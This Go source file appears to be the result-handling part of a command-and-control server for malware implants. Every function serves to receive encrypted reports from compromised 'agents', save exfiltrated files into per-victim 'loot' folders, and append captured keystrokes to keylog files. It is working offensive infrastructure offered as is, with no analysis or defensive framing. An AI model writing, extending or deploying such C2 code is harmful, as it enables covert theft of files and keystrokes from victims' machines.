package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sync"
)

var resultsStore = make(map[string][]Result)
var resultsMu sync.Mutex

func handleResult(w http.ResponseWriter, r *http.Request, agentID string) {
	heartbeatAgent(agentID)

	body, err := readEncryptedBody(r, agentID)
	if err != nil {
		log.Printf("[c2] decrypt error from agent %s: %v", agentID, err)
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	var res Result
	if err := json.Unmarshal(body, &res); err != nil {
		log.Printf("[c2] unmarshal error from agent %s: %v", agentID, err)
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	// Store in memory for CLI retrieval
	resultsMu.Lock()
	resultsStore[agentID] = append(resultsStore[agentID], res)
	resultsMu.Unlock()

	// Persist to database
	dbSaveResult(agentID, res)

	// Handle by type
	switch res.Type {
	case "text":
		log.Printf("[c2] text from %s: %s", agentID, res.Data)
	case "file":
		saveFile(agentID, res)
	case "keylog":
		appendKeylog(agentID, res.Data)
	}

	if len(res.Errors) > 0 {
		log.Printf("[c2] errors from %s: %v", agentID, res.Errors)
	}

	w.WriteHeader(http.StatusOK)
}

func saveFile(agentID string, res Result) {
	lootDir := filepath.Join("loot", agentID)
	if err := os.MkdirAll(lootDir, 0755); err != nil {
		log.Printf("[c2] mkdir error: %v", err)
		return
	}

	data, err := base64.StdEncoding.DecodeString(res.Data)
	if err != nil {
		log.Printf("[c2] b64 decode error from %s: %v", agentID, err)
		return
	}

	filename := res.Filename
	if filename == "" {
		filename = fmt.Sprintf("file_%d", len(resultsStore[agentID]))
	}
	path := filepath.Join(lootDir, filename)

	if err := os.WriteFile(path, data, 0644); err != nil {
		log.Printf("[c2] write error: %v", err)
		return
	}

	log.Printf("[c2] saved file from %s: %s (%d bytes)", agentID, filename, len(data))
}

func appendKeylog(agentID string, data string) {
	lootDir := filepath.Join("loot", agentID)
	if err := os.MkdirAll(lootDir, 0755); err != nil {
		log.Printf("[c2] mkdir error: %v", err)
		return
	}

	path := filepath.Join(lootDir, "keylogs.txt")
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[c2] open keylog error: %v", err)
		return
	}
	defer f.Close()

	if _, err := f.WriteString(data); err != nil {
		log.Printf("[c2] write keylog error: %v", err)
		return
	}

	log.Printf("[c2] keylog from %s: %d chars", agentID, len(data))
}

func getResults(agentID string) []Result {
	resultsMu.Lock()
	defer resultsMu.Unlock()
	return resultsStore[agentID]
}
